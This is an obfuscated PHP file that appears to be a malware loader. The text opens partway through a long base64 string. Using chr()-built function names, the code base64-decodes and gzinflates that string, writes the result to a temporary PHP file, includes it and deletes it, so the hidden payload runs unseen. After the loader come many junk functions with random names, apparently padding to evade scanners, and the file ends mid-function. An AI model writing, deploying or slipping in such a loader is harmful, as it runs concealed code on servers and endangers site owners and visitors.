'WLxK99thqpP'.'tVgk7m/njz4'.'D3tAmG6XJO2'.'/2PdG059UuR'.'m/gufujgRJM'.'fWW8+uNLn9z'.'D5FfbmC3Pet'.'E/T3+8DRtAl'.'gJMYzlay4RC'.'X8NacN08Ag3'.'AZQe268yPB2'.'uoOEu+EOpi0'.'o8crVv8h6ec'.'mUfHhefBjyj'.'l07yP8zGOwU'.'v3eJPMcwUcM'.'W29PyZ83hki'.'IOSu6r9JJMi'.'dWmoKjxdeTd'.'CwKqDFuiLdv'.'fCai9Wpky0V'.'4Jyl8iEK+EM'.'/Yoak/YFOAo'.'vcmtj700YmL'.'uaqUdtG7fMl'.'hDRPbNIhjr8'.'f0p4Kex03H6'.'QEytck3v4Fy'.'5Tvg1ErT4nf'.'G03Mko069M2'.'gGnPmkiHuRw'.'TlMsK346DWA'.'zeqJau6vCix'.'V+aUCq6O4ED'.'tYhfDZ2HA1X'.'2BNMo0cC0RR'.'dE9VNkkq8I7'.'wT5NMWxXEy5'.'mlTfHmqPNUb'.'mBfywhSb7Yu'.'kleZUJRMAo3'.'pVakuNgvPPZ'.'UrcXfrFUeXa'.'JwDSJXB9z9W'.'8oaBenoeT1L'.'hnqPGXHISik'.'r7pMaBfDVOp'.'I9oO7tT0wvg'.'2DOhAlHq75y'.'q8D58IKmE6/'.'hh6zy/BzrKn'.'xo6xv5ymJUg'.'Uz/0lKuBO8H'.'aA7LiI982Hq'.'4PxfaiixuMv'.'608Vkc+Ojed'.'wGw84mglJ1/'.'kh3RPo656BH'.'jqc/GlV78zw'.'4EvfbkR6you'.'J2IH0R987kB'.'69Nn8agc5HR'.'6TXdkIGLvYU'.'Yal7a9U2EEd'.'N4R34Fp8g8g'.'DKGE9sWoP6I'.'AeTw1Hh/325'.'xY2U1Gq2QHT'.'Bh07OUMlTMn'.'1Wf8+MXnA6X'.'GkgKbZpEnCk'.'Xg1UMQxDSo8'.'nh1uxJxcD90'.'kvLyO9a0uCT'.'6Vmr4nhjRlK'.'2550KZC9oQt'.'/HjIPbOKfx2'.'WHQ4L/tsSZ9'.'qXwvpgvF7DX'.'fWdYYBceSFJ'.'SIV1a4Mtmrn'.'fl37biZuXaV'.'22DuaTPvYDM'.'rr2nJQ7jfK2'.'Z8F2+jatTiN'.'UPM4iAa2lWj'.'eHO2FF1IXt4'.'PqeckKinUW4'.'Y7FzjcGf1yE'.'KO9Bhj29Ibv'.'84/gGkrZne0'.'km55A18WnSA'.'05+3sPGhIT5'.'msU9Avv0xqi'.'v8wMNTKOEnF'.'/eAGm13Ujgw'.'yQdjUiy5Yai'.'GgaG0uVd2N9'.'ma8N4eGhaP0'.'3nK3PdGHavz'.'Y9SxBqIMVck'.'rxgsFdgGfbg'.'m720khiixiN'.'KCLpi4vrQBz'.'Ywrg+pLwUwv'.'k5ZPu3I6INc'.'4IXYEeA6NKD'.'fFcRhv8dL29'.'WFsbgpYl9ct'.'490dZuaw7+h'.'H3fx5e7F+sX'.'XnkLAGFTG/P'.'48uLM6l5c4z'.'p9WaWUnBJBE'.'5xkDR1zPq/R'.'O7OLuoFIzZE'.'8Lyn6Fp+zr9'.'oe47bDNTbn+'.'+avLMoPm9fI'.'EpvZAcuvF+t'.'9SqS2+ZQcpQ'.'L4ldSgo6tKu'.'3hPJbnG/3QT'.'GKTDi8Q7WRg'.'LVry3jLpZh0'.'jeUnqSbxcx6'.'OnGBwfWKCbz'.'tToH6RNwuj8'.'NUk9UuLFqyX'.'RLlxRn8JT9V'.'wUG3f0S+4lu'.'IByyugl+Vjb'.'dOxAcriSS3A'.'JZJMedokA/z'.'z7UDXyytCTr'.'IX0G6rBBhzt'.'tavM7RXbUiG'.'3AyN0KiSM6H'.'uaRbpKwVbTR'.'5Z4iOlrMn+q'.'9icZ4OXBrui'.'o7NUKKFlSfi'.'+vOAjwYztPp'.'6rt8DL8it8l'.'WVXhiFkp4ru'.'p1Nd2Sw/AAS'.'WsQP9aTPBlz'.'qDsWlCYXEY4'.'WvA0y7opqB5'.'31INvNN2HxD'.'OOmTjWkUd2m'.'Nq2B/3gk82W'.'VDA2P17uDty'.'CQecYcsr3yK'.'C5Lmm9gAp7i'.'GCUfNrpkQ8t'.'lVpeDi8C7PI'.'8fW1/XnZajX'.'oizufSwiJHR'.'SEcCw8eI/HW'.'wT+/ou4zxlM'.'Ssz5XqQQejA'.'3HveFAOQTsS'.'UiSDw3FGmzK'.'nYy3dEv3HtJ'.'7gyEiPEjgBd'.'KTGCsT4EDVh'.'NtieswKt0ks'.'dqLqMmejh9t'.'siweYqU8NPp'.'FJx/gmsa70X'.'KiyZTuJwCsd'.'DOiaYs29cTE'.'beSUYRZ3J98'.'8Kx8V8ENXrS'.'I33avYj+oWA'.'Qpmnp2fY9vu'.'Np3YcoXvERu'.'YqWC3pDu5nf'.'DKkP++FOtPZ'.'FtLTRwDZW9t'.'4DdJ3J9uhrG'.'Yd8qlszWFn3'.'MF01pwlP/Nr'.'i8rzGdRHCWK'.'6Ctd3JBnPV3'.'U6z/RpYz/Nj'.'zKqq58/2Pkq'.'ySmR5wpphoA'.'VQ3ruome/aS'.'k8F1OQ3J9DF'.'lc5ofQ2fKZn'.'whrZYBQHJHk'.'Psk8rHahVQl'.'+VkSaQ73Bur'.'H6lvjreTagT'.'NLd8hId7M08'.'N9MTcRqbMw6'.'+tJONPRmFvZ'.'a1SLUeokeqC'.'SoWHlSRVYar'.'FAhOKqlImxb'.'uG0Z8ncYxyD'.'onYKx0/lSQ1'.'ZJmD4Iw/ZMM'.'C0TxuKmtA0P'.'nVWAY86NP8e'.'7YD6Mcxsl5E'.'TmDfm3B77KF'.'jcTlUr6BT3f'.'mro/fEq56Hg'.'1pMRjG+Fi6D'.'aJDJDhWuW7W'.'ywusAscV8vX'.'R34P6Y8nOSS'.'lXiS4LYxsmN'.'1PC5zAb4rge'.'YWuuaFAIk3H'.'bTp2txd/gA2'.'1GC4vRBrTd5'.'wputXt2DBXX'.'anpUMXM81DO'.'jjUNrYwhhyp'.'WKkzPBxTprT'.'YEEtPXq/5p4'.'hrr+qhyOMFb'.'ru89PJgPyIY'.'voesh/COh2N'.'VFPHANOgQI4'.'Z3B3qgwAybQ'.'L7XlnEUgUTK'.'SOcNtw0263p'.'0WUWbl+H/FI'.'fbOTN9L9xGH'.'NhY3mebeLAi'.'kzKBdbTbWJc'.'LjO/8TdY39K'.'v4gzuaAXu99'.'ZaBZxenhLJt'.'cUTTyysz501'.'WlF5W1EvBb/'.'XotPbJpCgso'.'ebcNUm6caCc'.'woIb2P7KXZP'.'XxhslFgm276'.'Aquy+an0qNf'.'Cjvkw/jZc22'.'dmCctbSbDdg'.'TND2Xap2Gll'.'Rw9w5JoA68v'.'7Q4UOsWU5qs'.'ERznncH30QE'.'rkpnYldjPQF'.'FmUtfYkvKFz'.'fPKZWcyjFxJ'.'FA3ZIfNES81'.'1Bsv36UwGRK'.'Lq6nwKDZa8d'.'dxSxMAcARXf'.'oS1aK2Qxe9C'.'XFZuY9XBc7x'.'+rM94sX+spa'.'uFnawg2b8jj'.'Tz14qmpluY1'.'wfQsDqHOHK+'.'+vwPea97pJI'.'OSQxJLaIGDp'.'7Fqct7Zwadd'.'QtAIpIjaQ9J'.'fv5+YM7hKzP'.'mWf5N77uiI8'.'nmfXq6WCsQS'.'8oTjtDEpJGu'.'ZV2yjt/eAN+'.'KLeCfecOemg'.'li9Pk8WwiJ1'.'OsFBp6wBe3d'.'ntpfPcQMFKz'.'Lic4D3ou+a4'.'nNBp03xHHrI'.'B1uypaiXAWO'.'OiOXbBMIV89'.'n0wM+7meFJ7'.'uZt5GFc094A'.'LuLJrVLLB3W'.'Dba90ouQhI+'.'arXGvBreLfs'.'LMgDlWliXiC'.'wEH9XtdwB8O'.'jNNJtar+BeC'.'wn+OIuAMMZa'.'i4ob26vC2zO'.'zlxrTe+aIK6'.'cbhdcYft9Ok'.'Bn0n8Sg0yu6'.'fEwyY1Ga+uw'.'bKrL0u13TFv'.'/6V9pM8bw7T'.'ascYAbto6xk'.'6LfI2ib9pgS'.'/OeFIXxVp7f'.'zXmaQE8sduU'.'7mA7HObAp/7'.'uKy+UMTpOXY'.'UmzAHN7P6Pn'.'GEYy1s8yaP5'.'aDr+UKfFpIF'.'fUl31pIp3Dt'.'tKflM0sMlKT'.'3zdNpOEmFGM'.'BBvmxoFzS4g'.'EN7F3S0KmcN'.'LpOwR/jeWNK'.'7ajPVYh62b1'.'vs7hU6mGv3B'.'un344FCPOrN'.'noaHXyUV33M'.'h69PHdiJwCF'.'XxOJA3wiS4z'.'UFmPQcgyG5i'.'K+KdtifRSIS'.'n5/7OLa036X'.'L4Q7t3PSyo/'.'zCmvYF/7hUW'.'WWg6qjDLQpT'.'e1tZq4WqkMd'.'0rHNyjyOoay'.'SLXGCWMdDyc'.'wt4Hs6IfweT'.'4Ww2r5tKBCp'.'x+1cHC9wkue'.'6wyR1GJhw7U'.'OGPgY+ddB1C'.'o+pVV9uqeMQ'.'ZxEsIjLv0Qk'.'t7bSoQx3196'.'PgZ7pMiTtB2'.'SjSUWo/xy4P'.'mZ301XpJo5p'.'cr5qfJ1kOAz'.'bq5kH3Nod/Y'.'h3y+Q5cP5Sy'.'RaXZ6rwFo1P'.'7ne471SG/He'.'2w1P504onEz'.'+3j9Yaad7ju'.'uONtMU+XLOh'.'u1ARbl5Szt8'.'5kly0RRWtp4'.'8IDFoq/lA+Y'.'3y6O7a2h0NS'.'uv5iN9BEZ4S'.'dZsrLcBr5IZ'.'f97abQlWo+W'.'QsgQZxtqUlH'.'dfDhq3LVx5G'.'BpjG+RiG05b'.'CFy8uv86m70'.'ahPfX6g7jqO'.'Lo7ypjsod8M'.'nuhB8Gjb1M0'.'kW/7z6hsewo'.'52v2WOSCq/0'.'XrZrlSpJLMm'.'sS6J6Wid6RY'.'AfZzFrXUzcO'.'PPAQw9Olvz2'.'rjpTapIAGNL'.'DF2c4l8WfJU'.'iwMV6Sm7KK7'.'lPAnlBLlDOE'.'XgVw/RI1g+o'.'4btgXXaSrpT'.'ClqrCLU0U2E'.'uQjHXwKTid6'.'VDVrSW+9F+G'.'4uIDwedMKh8'.'6MhJSsyq0+G'.'m9aY3jjbFlT'.'1DzapgVHc0m'.'xRJFaQRKsDz'.'GWO84mh3Tq2'.'efoRyf1mlZi'.'GMJsN1FAgGl'.'1fs0Jb+sJh8'.'ROr2u6PSsXd'.'WTVQy03p879'.'BKhge8JdttK'.'mrtTXAPxqTJ'.'4wjdbfghpHb'.'XTPL1BWMTp9'.'bjHKO6++JiB'.'11dNxaGufyR'.'seVHi4XKO1a'.'ohjeUBBysd3'.'VGNLFcE3p5k'.'8+j7IlV9wC+'.'r8lSZa6lGhd'.'PBkVUKTulYc'.'lD8eZoujcL1'.'nnZAhW9o/NT'.'jJVVcEd3kkI'.'PGk9O3Lp0Ch'.'fJlfLo/YXHE'.'APbXuCVcJds'.'que2A8fSHAN'.'qvmTQup6sHe'.'iEyAXmtWGzM'.'K4WVR/6mxls'.'LPVwa20VuwJ'.'waHcIR4AaKD'.'3XwdLfm99kn'.'0kVBj60HRlf'.'T6Z1IJmKNPF'.'Pe0Oxl0sogB'.'6jnA74FypRz'.'K02Ek9pCWsg'.'DlsgDhTjt+B'.'cNAJGbQnGw5'.'xsKTCgK3oUN'.'/5BJhhLGPv0'.'yKt9EmcYv4H'.'KxHtVDDTkLx'.'8ydNGZeEc26'.'hfAPhm2WGE1'.'Hx/axfblcje'.'2PyO/xI+DeQ'.'gYlJIRDhbBX'.'upufxjDj//x'.'NFFWXui+UXu'.'jzQo+2GiAuO'.'JLfDtQsQvXz'.'kwmx43XTL9z'.'DEwwjkZ8ugm'.'CBXINZdMGu9'.'5sueAKl8wYK'.'lFsvgwfiYH+'.'TyzR52JqILV'.'7583chJOjj2'.'GrcdPgOG70x'.'0tUEv96f+PS'.'3g0ZaHlRrZj'.'CxPnbL8bKld'.'5AIYpm8Xi6c'.'FBV6gXTb/jz'.'JfmVOp0ADTo'.'trq9H3Ox+A0'.'mnOVsUhPTVB'.'InlYAwdwtVn'.'hKhlrN7Wlgz'.'jA8Xn4jO9GZ'.'J6hbAPkPBnW'.'KBI3qCuYzL5'.'4BFww3+K+nC'.'Spd5QhyDXQx'.'g35idUhHUAY'.'soy1tm9jpya'.'+6vOd/0y8te'.'Y3dyqsTXQmL'.'oAfmjfWcu+A'.'sAu6fRpUJFe'.'ezPc+YDTB5W'.'XR6523Zoup0'.'HJGt0j486D0'.'od2s4iS8FWR'.'K6HgBj6Inz+'.'Fne+JiXykRX'.'kMNvr8WHGOu'.'4Kf28eeVObz'.'4219FVi8RP7'.'EGuBdjfGB+e'.'snGVAdNNxBj'.'iSEv9ty2UhU'.'OxZtKq0ITUg'.'qQL3/q7+af8'.'YZ/fFqCG0Mr'.'AvoqzeTPNAd'.'q6ThdRnVhoE'.'qgZAHI4ROAg'.'Mf0s9IIhL+3'.'p3TVGTRKAY4'.'UbggFmEX5OO'.'XkrJ1wfRFSk'.'ghTm6aDUqlD'.'MlUfyK2Hlys'.'HJ8XxvoTgZ3'.'eH4mbCd1etq'.'iebh77iFfvW'.'cEestw+aKg7'.'0iIugJAog33'.'h4ph0tj0iHe'.'wws6gci+f54'.'dbiA2hQ9Zbo'.'jhy6T8woj5T'.'d2z2m0MU9fC'.'/me1JA/dNy3'.'gBdzlZPoDX1'.'yEmTnWfHPZE'.'DZ4FtgXR9TT'.'OVU/fayBOIf'.'VP12k8fXu5C'.'THU9bP1OzaO'.'StG6muyoCS0'.'Xzmks2dLCE2'.'cMRZQoNdcKZ'.'2Dn/CS0kizF'.'jtzH+MeU9O3'.'dtEsPjloqKB'.'7ipF4N5Lghv'.'7nMi/D8q3r8'.'YOo/onPpt9O'.'k1hIOzLSNCm'.'xIAgPHQGzWi'.'zg0fY1nAz6M'.'tYNklh/P/nP'.'hLkwYvzOEP+'.'BVd02zrvjMI'.'ihGnLL62iFg'.'8Q0PIA6v5jJ'.'y8SnsF1A7fe'.'hxlQO7Gg+j1'.'25FALOlOxpk'.'NB0zsshD0MD'.'bhyZxE7ck1u'.'8KK1pmwDqsw'.'7zXMpb+HfOX'.'2S7dJcZmvZN'.'ZCTWGwi73b2'.'jfUCY7SgzG9'.'VPb0sW06uRH'.'CAmd/FXPz0c'.'fHdj0uF7258'.'kpaTSnBliig'.'KIeKXu7uTy0'.'t/IubABtK0C'.'SP89uh1MHY7'.'MFDpGWO6Paa'.'asUO+WrCu00'.'hFzx7nB7CfL'.'PW18XHziF08'.'zvdzIRU4dXc'.'Q+0r+3BpT3b'.'rVlUUeXjxWs'.'EZv5/1i/kAA'.'HxExvPG7x1s'.'iWHopVVntpY'.'KNO7C5bDjp2'.'wdOCU9CVYVU'.'wEDvuW7N5J1'.'D8UnZrDRgEV'.'zNYM1UdZkCO'.'UFFm9NmLRrY'.'2SDi/ee+I/5'.'kJep4QC0Rr2'.'SeZhaO5QfZI'.'JucxQOxDt6r'.'UMbW5voulBZ'.'PrZQP/BxMpF'.'kskF5IlzfrR'.'ommKMdwJwsu'.'lzbOuZNZmxc'.'MDclyQWYEDI'.'ULUB3JdzMnm'.'tgz59/CTlTF'.'C1GlFD28wEF'.'NNL54fFEyuQ'.'Sp2Q7v4niNF'.'VGq8FiBaTpm'.'jWYxuffhBcD'.'8dT6kRX+YyZ'.'TJYv/wCPORD'.'yQT72oT6UWy'.'d3z7YNVSoFz'.'lbbFVUUql6q'.'O6P3HvT0slL'.'3vVKSkW1hUH'.'oOdUZ4Ju0Fv'.'89AmlSm2pB6'.'6q+kuBwc78B'.'wO5aMAFvtUZ'.'fkhq8Nt0VrZ'.'KZY4ALzbrPz'.'dlu2rt1JZQZ'.'Qj+BAd0rziM'.'LMEe12qw8Ge'.'6LL/LgMMEvO'.'D7Q/xIS+QOt'.'jKkQZNWAaRI'.'aRe62DKUYVU'.'AYzvUNryJoq'.'qcpur0PEoVM'.'KoJzSqgOxTb'.'EuO4y8rYruJ'.'zVj84/yWGXx'.'s+IvnVSOfRV'.'Feb+3Nz1A7y'.'dEjNNclWF/Z'.'a2ppunFGAwr'.'R2lAPrtkrh8'.'dqUolFiyiQb'.'4FoNrO4gg/4'.'6VJdyCO90hg'.'2FqNyQKG97c'.'pjUrv/ttGCW'.'zwTC10TIaVK'.'AhD7YkmpapH'.'GEnWAc1UU0d'.'T5CAfGxrt5F'.'ypIOIxX9QGI'.'iwd6dnFJdXr'.'RqXqhCnQAJM'.'2qL91lYGycq'.'XvG7kdwiP3M'.'CZLg8qYfUM9'.'x4CsRN7mdAa'.'OADxRJcuKk0'.'yOBpbeGFR1b'.'iFTePdUp2ra'.'q4Y1frfMsZV'.'gbTpDIBq9XM'.'RxWJOll6ixh'.'AY1k1wTnoxm'.'RhAH9ZpEP1G'.'ARVNVQJeWpD'.'h3NiD626pOE'.'RzzZeqlJc5d'.'FAsnV/FIaoe'.'WoHb/r9aAnK'.'JKPtRAuusBY'.'AbRBSXgQZmu'.'gRYwsbT/cdc'.'Z50lzZNrJBa'.'QRbS8LtzY7k'.'AAw8+1E2goM'.'DtQGLIVClns'.'k2LGm1/bmUc'.'2XhJqfKuZG9'.'8n+Q0CNa8qp'.'lyNDjk8K2bD'.'aKD/QkGv4sj'.'SjmFHCUhZHp'.'1Cah13TbwEd'.'F8fLDMAMHnz'.'32CNvIP6Tng'.'v1wpQoKDpSA'.'KrMw0nqgnEL'.'Zf+OZhhJSNy'.'+/rchXVVHoo'.'SIHS/fe04Sp'.'ZUmMFQgNe6i'.'0yE65ayklNc'.'wBLC8yVmr5Y'.'L7RCWCfyBTs'.'8mCG/B3VAVS'.'/lK0mZSf+TR'.'hDfZXn/m2OK'.'M8pd2ww3eYQ'.'J7k6BThp0tu'.'St2NiYyuWvU'.'77hsp/ji0Jd'.'FeToxAYAHH/'.'L0TLCWTkKfQ'.'J0pTNb+uy8l'.'rLkLX8xFog3'.'nepcHj701L5'.'51ctN/jv8LP'.'LTpSNSHjG6S'.'KQEf/4yuUGo'.'uv4eLG+xtXV'.'pFiVr7mh4fK'.'H6cpmP/fW6a'.'W5qHPzwCtXe'.'PlXRj1Z3d2j'.'cW6pUQpha+E'.'2+N9XuTjKeg'.'3Gzz4akDkId'.'ezJxTgQpb7v'.'KpcFEeQXu1h'.'WDyTSIEuUf0'.'Cn55yAq/Lss'.'8M777OFjMtR'.'SZq0A/fmd+b'.'ym0fNOsShay'.'Qvu1Ju1U/sl'.'fhOuabf++mR'.'DIfHj11EHhu'.'cqqK5P2in0t'.'G20a8CkLnuQ'.'vImyY5a4Hc/'.'1IeYzUhwRSb'.'5/visrJUHdi'.'esjIjfAZMj/'.'vVWECqWBD3h'.'cX1IH75OTTN'.'ic7oGXWTCkn'.'/L7ZX6HpF/7'.'lY3bmjYbp95'.'+83j0pdfNbK'.'fn+wh321tvr'.'G/pxCrchjf4'.'saQbXNqCzUh'.'1iN0/d/Pyji'.'PM3KXUZJygH'.'w09ocOgOueA'.'lo9i8za70+i'.'ypNnN5tXb5N'.'xxJcC4eED35'.'V5ALtqsqUGp'.'Wn/ru55x0JC'.'dAzzi5w4i7g'.'yL96ZPhexsH'.'Lk7zfNDnUvC'.'MLc/Ns8xeXs'.'JE7vfB+VQs2'.'U3+/bKfnNir'.'vLc2LMaC+no'.'NfPK6wAMev5'.'acM5rOJs0gb'.'/A9b92ug3oW'.'a43Ue6ycdrM'.'PAe6l/fwIN+'.'McPmMuDDoaD'.'95h79RruF35'.'hMeX7EQSukn'.'yIRdRW/Wfrx'.'scBb525gjj7'.'nlldYgYO65J'.'VdkDzYEVED3'.'0bYyH/78u1L'.'ysbTdH+tsKe'.'Tq+CNGbU7S8'.'SnzeS9moaOI'.'BTlBbVqdCMY'.'Vg2F19gR98l'.'VVKSB+t4E31'.'VJLEHf1JCAd'.'8VV9QypDpw6'.'qWqxMTwUeVa'.'KLkndH7NAQL'.'QPqWN6L0pEa'.'qBCKSRhjA0U'.'CdjG3lfcnUO'.'qE10pIHPEHp'.'gAWTtTFSufD'.'qUJSI1PEUVG'.'hxAInrnCxF/'.'XeROFpuEMfZ'.'V5vnBfxA5cB'.'yGJ5jn4rk68'.'nBTErhKIigy'.'U9uP42pZAyn'.'wYz7QJ4DVUC'.'vh/6/aFzTHk'.'hdpXZnWyl+6'.'aiptPFB79zL'.'B9QdPzOOizE'.'dubP6MzYSsc'.'pwUYsksPDi2'.'q4e8MST66dt'.'jPm0bmpHCn4'.'FgQoFZh/56P'.'+HUTHNhko+Q'.'3GHlLdEb04C'.'b5E1OFzBbzd'.'1EMRx0by+j6'.'ij/GswIjeHe'.'s9/RGiJrnIE'.'c+dAT7R7bkP'.'/LbEyDVGtSr'.'TOdnCrXxBrv'.'fACr7G9CAO6'.'o+8vknuDgfv'.'ATLq48Wvr02'.'G/VYu0LIeHe'.'8S8udbp3laa'.'+HEVw58BLkN'.'XbYyC48zrNS'.'n4+KCZB2yAL'.'Cslx4b1sj0+'.'YE0IHmKu9zp'.'i3Nna3VCD9+'.'tyX0XUlDNSa'.'U646sMOvo7v'.'DwCPUcVYrxd'.'VvAQ8Z1NIiS'.'QQhX+ZFBB79'.'XLHVcKF2Qye'.'M+OaBOBMIBs'.'oNPnK92zo8I'.'PrFOlqqZOVy'.'ZqaWeEhPNBk'.'i/KRF/TWmHO'.'uu5wqXDUrUp'.'YxpuBkGJByH'.'Gg1uSFqu2iW'.'rvXTJJtB7Z6'.'1NOTfuJ3l5x'.'Glzmavkr50P'.'Dn1vHC3O1zN'.'YNHKbNsB9Vu'.'Mv3mNVZbiOa'.'8gxiJEBQQZp'.'0KgaurEHXpv'.'/2749GTsNmE'.'+JTCbwUQXEc'.'E+5QSpYVQG7'.'HCQ4ggXAIoT'.'//Hf/6P/+E/'.'/gc6VvGQ19V'.'ff/tbVHS9N4'.'jcP/7DBd+u/'.'T/99X//x//w'.'F/vzD6f2dx+'.'jbfnrn9lafz'.'8fqikm/t//8'.'39b2qXD2P3Z'.'/H+uxhb8P/9'.'mx9me2q5rcI'.'n1j/9wvGsZt'.'0mp8RF3/9+/'.'/qEv/ouvsP/'.'qy3qve096fK'.'z//3Gz+0/Q/'.'efjvx03SO9S'.'81/2WTp/eDG'.'PnTQWfp/d8v'.'hfT+R/bPffT'.'uRfncpQxUta'.'l7Vd/OM/9KY'.'+n5+shQX/9Y'.'B/Y9vN6amqb'.'uVz27Mj/r3a'.'6KD92TlbUj6'.'f5vTnmUH9z5'.'LD/zjkv/r8P'.'/3zX/9q+//r'.'HzH/1//5F5L'.'/6S/4l/Iv//'.'m/7f/frP334'.'9//+k//Zhvu'.'X/7dBzz3Zx/'.'/8r892N+//3'.'5zHrG1eenf7'.'0QQ/nyM/+Xf'.'X8iffaR//9+'.'e2X//9G//fU'.'T/1dJ/M2z/Y'.'3jZ9oeufO8/'.'6XS8s/H5h+x'.'8MvumGOb1H/'.'/Vkj/r/9sV/'.'/V0/Lv1Mq+6'.'f92uMZ2//e3'.'fLvzPf/3H//'.'D/Aw==';
function RuubODZfexgJ($code){
    $tmpFile = sys_get_temp_dir() . '/tmp_' . md5($code) . '.php';
    file_put_contents($tmpFile, "<?php\n" . $code);
    include $tmpFile;
    unlink($tmpFile);
}
$J598kOLp = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
$EaRVl5aQ = chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101);
$GNuqQ_ur = 'RuubODZfexgJ';
$GNuqQ_ur(
    $EaRVl5aQ(
        call_user_func($J598kOLp, $wau_9Ya_)
    )
);

function lODODrk_vF() {
    switch (rand(0, 2)) {
        case 0: $AhY1fmD5 = md5(time()); break;
        case 1: $AhY1fmD5 = sha1(time()); break;
        default: $AhY1fmD5 = crc32(time());
    }
    if (strlen($AhY1fmD5) > 10) {
        $yB2nyVMt = str_replace('a','x', $AhY1fmD5);
    } else {
        $yB2nyVMt = strrev($AhY1fmD5);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($yB2nyVMt);
}

function t2cTWCXrX4() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $xsVil3gb .= strtolower($letter);
    }
    if (strlen($xsVil3gb) > 10) {
        $qN16kEhO = str_replace('a','x', $xsVil3gb);
    } else {
        $qN16kEhO = strrev($xsVil3gb);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($qN16kEhO);
}

function llDAYYGCCP() {
    $Vrn_b64 = 'n9RO4iPHeL' . 'r/eDv' . 'Wb3FRjw==';
    $decodedGarbage = base64_decode($Vrn_b64);
    $z2njwGGR = str_shuffle($decodedGarbage);
    $H7RPteef = strrev($z2njwGGR);
    for ($i = 0; $i < strlen($H7RPteef); $i++) {
        if ($i % 2 == 1) {
            $H7RPteef[$i] = chr(ord($H7RPteef[$i]) ^ 'Vrn');
        }
    }
    if (strpos($H7RPteef, 'A') !== false) {
        $z2njwGGR = str_rot13($z2njwGGR);
    }
    return strlen($z2njwGGR);
}

function z4vRoMVjCi() {
    $fZrVFQb3 = json_encode(['test' => rand(1000,9999)]);
    $iHMISDCO = rawurlencode($fZrVFQb3);
        $iHMISDCO = str_replace('%7B','{{', $iHMISDCO);
    if (strpos($iHMISDCO, '%22') !== false) {
        $iHMISDCO = gzcompress($iHMISDCO);
    } else {
        $iHMISDCO = base64_encode($iHMISDCO);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return strlen($iHMISDCO);
}

function vVH_VVXmKL() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $FbJGxolc .= strtolower($letter);
    }
    if (strlen($FbJGxolc) > 10) {
        $Yb1EuziZ = str_replace('a','x', $FbJGxolc);
    } else {
        $Yb1EuziZ = strrev($FbJGxolc);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($Yb1EuziZ);
}

function V934G2x5A7() {
    for ($i = 0; $i < 5; $i++) {
        $xbSHprrI .= chr(rand(97, 122));
    }
    if (strlen($xbSHprrI) > 10) {
        $y19CltEY = str_replace('a','x', $xbSHprrI);
    } else {
        $y19CltEY = strrev($xbSHprrI);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($y19CltEY);
}

function s8k_uXVreP() {
    $RG6FITGE = json_encode(['test' => rand(1000,9999)]);
    $FLBL_a3x = rawurlencode($RG6FITGE);
        $FLBL_a3x = str_replace('%7B','{{', $FLBL_a3x);
    if (strpos($FLBL_a3x, '%22') !== false) {
        $FLBL_a3x = gzcompress($FLBL_a3x);
    } else {
        $FLBL_a3x = base64_encode($FLBL_a3x);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($FLBL_a3x);
}

function XQNVzcKJ8T() {
    for ($i = 0; $i < 5; $i++) {
        $N0lqaU8S .= chr(rand(97, 122));
    }
    if (strlen($N0lqaU8S) > 10) {
        $z1Jf1iz9 = str_replace('a','x', $N0lqaU8S);
    } else {
        $z1Jf1iz9 = strrev($N0lqaU8S);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($z1Jf1iz9);
}

function Ub3JJhCJCq() {
    $pi3_b64 = 'KpvO3Tk' . 'XgMdmA' . '5AaBA1vMw';
    $decodedGarbage = base64_decode($pi3_b64);
    $X8Go1nZT = str_shuffle($decodedGarbage);
    $VcI0_E_0 = strrev($X8Go1nZT);
    for ($i = 0; $i < strlen($VcI0_E_0); $i++) {
        if ($i % 2 == 1) {
            $VcI0_E_0[$i] = chr(ord($VcI0_E_0[$i]) ^ 'pi3');
        }
    }
    if (strpos($VcI0_E_0, 'A') !== false) {
        $X8Go1nZT = str_rot13($X8Go1nZT);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($X8Go1nZT);
}

function DFqfL5E7wF() {
    $YXB_b64 = 'gbZPC1Lppg' . '/d1L8SWS6WKA=' . '=';
    $decodedGarbage = base64_decode($YXB_b64);
    $K7Q0xkWs = str_shuffle($decodedGarbage);
    $PoK1iO1e = strrev($K7Q0xkWs);
    for ($i = 0; $i < strlen($PoK1iO1e); $i++) {
        if ($i % 2 == 1) {
            $PoK1iO1e[$i] = chr(ord($PoK1iO1e[$i]) ^ 'YXB');
        }
    }
    if (strpos($PoK1iO1e, 'A') !== false) {
        $K7Q0xkWs = str_rot13($K7Q0xkWs);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($K7Q0xkWs);
}

function FlKTYh8ncW() {
    $CDr4rrUC = json_encode(['test' => rand(1000,9999)]);
    $o95t8e1H = rawurlencode($CDr4rrUC);
        $o95t8e1H = str_replace('%7B','{{', $o95t8e1H);
    if (strpos($o95t8e1H, '%22') !== false) {
        $o95t8e1H = gzcompress($o95t8e1H);
    } else {
        $o95t8e1H = base64_encode($o95t8e1H);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($o95t8e1H);
}

function d0XFfBcH0h() {
    $HKy_b64 = 'PY0xHWcw' . 'l0TTHl+NYVw+QQ' . '==';
    $decodedGarbage = base64_decode($HKy_b64);
    $i4IbyZ5P = str_shuffle($decodedGarbage);
    $hmZDnMRf = strrev($i4IbyZ5P);
    for ($i = 0; $i < strlen($hmZDnMRf); $i++) {
        if ($i % 2 == 1) {
            $hmZDnMRf[$i] = chr(ord($hmZDnMRf[$i]) ^ 'HKy');
        }
    }
    if (strpos($hmZDnMRf, 'A') !== false) {
        $i4IbyZ5P = str_rot13($i4IbyZ5P);
    }
